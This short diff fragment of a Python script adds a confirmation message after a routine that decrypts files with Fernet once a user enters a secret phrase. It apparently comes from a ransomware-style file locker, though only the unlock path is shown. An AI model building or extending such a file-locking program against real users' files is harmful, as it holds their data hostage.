@@ -27,3 +27,4 @@ if user_phrase == secretphrase:
             contents_decrypted = Fernet(secretkey).decrypt(contents)
             with open(file, "wb") as thefile:
                     thefile.write(contents_decrypted)
+            print("Your files are now decrypted.")
